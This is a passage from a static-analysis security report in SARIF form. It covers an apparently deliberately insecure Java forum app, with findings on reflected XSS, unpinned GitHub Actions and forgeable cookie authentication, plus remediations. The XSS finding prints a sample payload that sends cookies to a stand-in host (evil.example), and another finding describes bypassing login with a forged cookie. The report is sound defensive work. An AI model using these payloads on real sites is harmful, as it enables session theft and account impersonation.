        {
          "ruleId": "cross-site-scripting/reflected",
          "level": "error",
          "message": {
            "text": "The JSP EL expression <code>${prefillUsername}</code> is interpolated directly into HTML text content on line 14 without any HTML encoding. The value is sourced from the <code>username</code> URL query parameter (<code>/auth/login?username=...</code>) — fully attacker-controlled — and placed into the page by <code>AuthenticationController.login()</code> via <code>request.setAttribute(\"prefillUsername\", username)</code> with no sanitization.\\n\\nAn attacker can craft a URL such as:\\n``<code>\\n/auth/login?username=&lt;script&gt;document.location='https://evil.example/steal?c='+document.cookie&lt;/script&gt;\\n</code>`<code>\\nWhen the victim follows this link, the browser executes the injected script in the context of the forum's origin, enabling session cookie theft, phishing overlays, credential harvesting, and more.\\n\\nJSP EL expressions (</code>${}<code>) do <strong>not</strong> HTML-encode their output by default; JSTL's </code>&lt;c:out&gt;` or explicit encoding is required.<h3>Affected Code</h3><code>src/main/webapp/WEB-INF/views/auth/login.jsp</code><pre>&nbsp;9&nbsp;|&nbsp;&lt;div class=\"column is-6 is-offset-3\"&gt;\n10&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;c:if test=\"${!authenticationFailed}\"&gt;\n11&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;p class=\"subtitle has-text-grey\"&gt;Please login to access the forum&lt;/p&gt;\n12&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/c:if&gt;\n13&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;c:if test=\"${authenticationFailed}\"&gt;\n14&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;p class=\"subtitle has-text-danger\"&gt;Authentication failed for user ${prefillUsername}, please retry&lt;/p&gt;\n15&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/c:if&gt;\n16&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"box\"&gt;\n17&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"field\"&gt;\n18&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"control has-icons-left\"&gt;\n19&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input name=\"username\" class=\"input is-large\" type=\"text\"</pre><h3>Remediation</h3>Replace the bare EL expression with JSTL's HTML-encoding output tag:\\n``<code>jsp\\n&lt;p class=\\\"subtitle has-text-danger\\\"&gt;\\n    Authentication failed for user &lt;c:out value=\\\"${prefillUsername}\\\"/&gt;, please retry\\n&lt;/p&gt;\\n</code>`<code>\\n</code>&lt;c:out&gt;<code> HTML-encodes </code>&lt;<code>, </code>&gt;<code>, </code>\\\"<code>, </code>'<code>, and </code>&amp;` by default, preventing injection into both HTML text and attribute contexts.",
            "markdown": "The JSP EL expression `${prefillUsername}` is interpolated directly into HTML text content on line 14 without any HTML encoding. The value is sourced from the `username` URL query parameter (`/auth/login?username=...`) — fully attacker-controlled — and placed into the page by `AuthenticationController.login()` via `request.setAttribute(\"prefillUsername\", username)` with no sanitization.\\n\\nAn attacker can craft a URL such as:\\n```\\n/auth/login?username=<script>document.location='https://evil.example/steal?c='+document.cookie</script>\\n```\\nWhen the victim follows this link, the browser executes the injected script in the context of the forum's origin, enabling session cookie theft, phishing overlays, credential harvesting, and more.\\n\\nJSP EL expressions (`${}`) do **not** HTML-encode their output by default; JSTL's `<c:out>` or explicit encoding is required."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "src/main/webapp/WEB-INF/views/auth/login.jsp"
                },
                "region": {
                  "startLine": 14,
                  "snippet": {
                    "text": "                    <div class=\"column is-6 is-offset-3\">\n                        <c:if test=\"${!authenticationFailed}\">\n                            <p class=\"subtitle has-text-grey\">Please login to access the forum</p>\n                        </c:if>\n                        <c:if test=\"${authenticationFailed}\">\n                            <p class=\"subtitle has-text-danger\">Authentication failed for user ${prefillUsername}, please retry</p>\n                        </c:if>\n                        <div class=\"box\">\n                            <div class=\"field\">\n                                <div class=\"control has-icons-left\">\n                                    <input name=\"username\" class=\"input is-large\" type=\"text\""
                  }
                }
              }
            }
          ],
          "fingerprints": {
            "fortify/instance-id": "3367D21BCDB5E8735ABCB527DAB3EBEA"
          },
          "properties": {
            "impact": 4,
            "likelihood": 4.5,
            "snippetStartLine": 9,
            "summary": "User-controlled ${prefillUsername} is reflected into HTML text content without encoding, enabling reflected XSS.",
            "remediationSummary": "Replace ${prefillUsername} with &lt;c:out value=\"${prefillUsername}\"/&gt; to HTML-encode user-controlled output in HTML text context.",
            "remediation": "Replace the bare EL expression with JSTL's HTML-encoding output tag:\\n```jsp\\n<p class=\\\"subtitle has-text-danger\\\">\\n    Authentication failed for user <c:out value=\\\"${prefillUsername}\\\"/>, please retry\\n</p>\\n```\\n`<c:out>` HTML-encodes `<`, `>`, `\\\"`, `'`, and `&` by default, preventing injection into both HTML text and attribute contexts."
          }
        },
        {
          "ruleId": "build-misconfiguration",
          "level": "note",
          "message": {
            "text": "The workflow references every external action by a mutable, floating version tag:\n\n- <code>actions/checkout@v2</code> (line 33)\n- <code>github/codeql-action/init@v1</code> (line 46)\n- <code>github/codeql-action/autobuild@v1</code> (line 57)\n- <code>github/codeql-action/analyze@v1</code> (line ~66)\n\nA version tag such as <code>v1</code> or <code>v2</code> can be silently force-pushed to point to an entirely different commit at any time — either by the action's maintainer (inadvertent breaking change), by an adversary who compromises the maintainer's account, or as a deliberate supply-chain attack. When GitHub executes the workflow it will fetch whatever commit the tag currently resolves to, without any integrity check. Because actions run in the same runner environment as the rest of the workflow they have full access to all GitHub Actions secrets, the <code>GITHUB_TOKEN</code>, and the checked-out repository contents. A malicious action replacement could exfiltrate secrets, inject backdoors into build artifacts, or tamper with code-scanning results.<h3>Affected Code</h3><code>.github/workflows/codeql-analysis.yml</code><pre>28&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Learn more...\n29&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# https://docs.github.com/en/github/finding-security-vulnerabilities-and-errors-in-your-code/configuring-code-scanning#overriding-automatic-language-detection\n30&nbsp;|&nbsp;\n31&nbsp;|&nbsp;steps:\n32&nbsp;|&nbsp;- name: Checkout repository\n33&nbsp;|&nbsp;&nbsp;&nbsp;uses: actions/checkout@v2\n34&nbsp;|&nbsp;&nbsp;&nbsp;with:\n35&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# We must fetch at least the immediate parents so that if this is\n36&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# a pull request then we can checkout the head.\n37&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fetch-depth: 2</pre><h3>Remediation</h3>Pin every external <code>uses:</code> reference to an <strong>immutable commit SHA</strong> rather than a version tag. For example:<pre>uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2\nuses: github/codeql-action/init@ff0a06e83cb2de871e5a09832bc6a81e7276941f  # v3\nuses: github/codeql-action/autobuild@ff0a06e83cb2de871e5a09832bc6a81e7276941f  # v3\nuses: github/codeql-action/analyze@ff0a06e83cb2de871e5a09832bc6a81e7276941f  # v3</pre>Keep the human-readable version in a comment. Tooling such as Dependabot (<code>update-config: github-actions</code>) or <code>pin-github-action</code> can automate this and keep the SHAs up to date.",
            "markdown": "The workflow references every external action by a mutable, floating version tag:\n\n- `actions/checkout@v2` (line 33)\n- `github/codeql-action/init@v1` (line 46)\n- `github/codeql-action/autobuild@v1` (line 57)\n- `github/codeql-action/analyze@v1` (line ~66)\n\nA version tag such as `v1` or `v2` can be silently force-pushed to point to an entirely different commit at any time — either by the action's maintainer (inadvertent breaking change), by an adversary who compromises the maintainer's account, or as a deliberate supply-chain attack. When GitHub executes the workflow it will fetch whatever commit the tag currently resolves to, without any integrity check. Because actions run in the same runner environment as the rest of the workflow they have full access to all GitHub Actions secrets, the `GITHUB_TOKEN`, and the checked-out repository contents. A malicious action replacement could exfiltrate secrets, inject backdoors into build artifacts, or tamper with code-scanning results."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": ".github/workflows/codeql-analysis.yml"
                },
                "region": {
                  "startLine": 33,
                  "snippet": {
                    "text": "        # Learn more...\n        # https://docs.github.com/en/github/finding-security-vulnerabilities-and-errors-in-your-code/configuring-code-scanning#overriding-automatic-language-detection\n\n    steps:\n    - name: Checkout repository\n      uses: actions/checkout@v2\n      with:\n        # We must fetch at least the immediate parents so that if this is\n        # a pull request then we can checkout the head.\n        fetch-depth: 2\n"
                  }
                }
              }
            }
          ],
          "fingerprints": {
            "fortify/instance-id": "4262858276DE7B69FFC9D6663C2F4FB1"
          },
          "properties": {
            "impact": 1.5,
            "likelihood": 1.5,
            "snippetStartLine": 28,
            "summary": "All four GitHub Actions are referenced via mutable version tags instead of pinned commit SHAs, enabling supply-chain substitution attacks.",
            "remediationSummary": "Replace all @v1/@v2 action tags with the corresponding immutable commit SHA hashes to prevent tag-mutation supply-chain attacks.",
            "remediation": "Pin every external `uses:` reference to an **immutable commit SHA** rather than a version tag. For example:\n\n```yaml\nuses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2\nuses: github/codeql-action/init@ff0a06e83cb2de871e5a09832bc6a81e7276941f  # v3\nuses: github/codeql-action/autobuild@ff0a06e83cb2de871e5a09832bc6a81e7276941f  # v3\nuses: github/codeql-action/analyze@ff0a06e83cb2de871e5a09832bc6a81e7276941f  # v3\n```\n\nKeep the human-readable version in a comment. Tooling such as Dependabot (`update-config: github-actions`) or `pin-github-action` can automate this and keep the SHAs up to date."
          }
        },
        {
          "ruleId": "authentication-bad-practice",
          "level": "error",
          "message": {
            "text": "In <code>AuthenticationController.setCookie()</code>, the authenticated user's identity is stored as the raw username string inside a plain HTTP cookie with no server-side session binding, no HMAC signature, and no integrity protection:<pre>Cookie cookie = new Cookie(\"user\", username);</pre><code>AuthenticationFilter</code> then grants access to protected routes simply by checking whether a cookie named <code>user</code> *exists* (it does not even validate its value against any server-side session or token store). Any attacker can forge authentication by issuing a request with a manually crafted <code>Cookie: user=****</code> header, completely bypassing the login step. The attacker's chosen username is also used verbatim as the <code>author</code> field when posting messages (<code>@CookieValue(value = \"user\") String user</code> in <code>MessageController</code>), enabling full identity spoofing.<h3>Affected Code</h3><code>src/main/java/com/example/insecureforum/web/AuthenticationController.java</code><pre>51&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eraseCookie(request, response);\n52&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return new RedirectView(\"/\", true);\n53&nbsp;|&nbsp;}\n54&nbsp;|&nbsp;\n55&nbsp;|&nbsp;private void setCookie(HttpServletRequest request, HttpServletResponse response, String username) {\n56&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Cookie cookie = new Cookie(\"user\", username);\n57&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cookie.setPath(\"/\");\n58&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cookie.setMaxAge(-1);\n59&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;response.addCookie(cookie);\n60&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;request.setAttribute(\"loggedIn\", true);\n61&nbsp;|&nbsp;}</pre><h3>Remediation</h3>Replace the cookie-as-identity pattern with a proper server-side session:\n1. On successful login, create an <code>HttpSession</code> and store the authenticated username in it: <code>request.getSession(true).setAttribute(\"user\", username)</code>.\n2. Issue only an opaque, server-generated session ID cookie (handled automatically by the servlet container).\n3. In <code>AuthenticationFilter</code>, validate identity by reading <code>session.getAttribute(\"user\")</code> rather than a cookie value.\n4. On logout, invalidate the session: <code>session.invalidate()</code>.\n\nAlternatively, use Spring Security's full authentication framework.",
            "markdown": "In `AuthenticationController.setCookie()`, the authenticated user's identity is stored as the raw username string inside a plain HTTP cookie with no server-side session binding, no HMAC signature, and no integrity protection:\n\n```java\nCookie cookie = new Cookie(\"user\", username);\n```\n\n`AuthenticationFilter` then grants access to protected routes simply by checking whether a cookie named `user` *exists* (it does not even validate its value against any server-side session or token store). Any attacker can forge authentication by issuing a request with a manually crafted `Cookie: user=****` header, completely bypassing the login step. The attacker's chosen username is also used verbatim as the `author` field when posting messages (`@CookieValue(value = \"user\") String user` in `MessageController`), enabling full identity spoofing."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "src/main/java/com/example/insecureforum/web/AuthenticationController.java"
                },
                "region": {
                  "startLine": 56,
                  "snippet": {
                    "text": "        eraseCookie(request, response);\n        return new RedirectView(\"/\", true);\n    }\n\n    private void setCookie(HttpServletRequest request, HttpServletResponse response, String username) {\n        Cookie cookie = new Cookie(\"user\", username);\n        cookie.setPath(\"/\");\n        cookie.setMaxAge(-1);\n        response.addCookie(cookie);\n        request.setAttribute(\"loggedIn\", true);\n    }"
                  }
                }
              }
            }
          ],
          "fingerprints": {
            "fortify/instance-id": "F4949EB6E45ED4DB59CFBA52F1C4837B"
          },
          "properties": {
            "impact": 4,
            "likelihood": 4,
            "snippetStartLine": 51,
            "summary": "The user's identity is stored as a plain, unsigned, forgeable username cookie with no server-side session, allowing any attacker to impersonate any user.",
            "remediationSummary": "Replace the username-as-cookie identity pattern with a server-side HttpSession; store the authenticated username in the session and validate it there.",
            "remediation": "Replace the cookie-as-identity pattern with a proper server-side session:\n1. On successful login, create an `HttpSession` and store the authenticated username in it: `request.getSession(true).setAttribute(\"user\", username)`.\n2. Issue only an opaque, server-generated session ID cookie (handled automatically by the servlet container).\n3. In `AuthenticationFilter`, validate identity by reading `session.getAttribute(\"user\")` rather than a cookie value.\n4. On logout, invalidate the session: `session.invalidate()`.\n\nAlternatively, use Spring Security's full authentication framework."
          }
        }
      ]
    }
  ]
}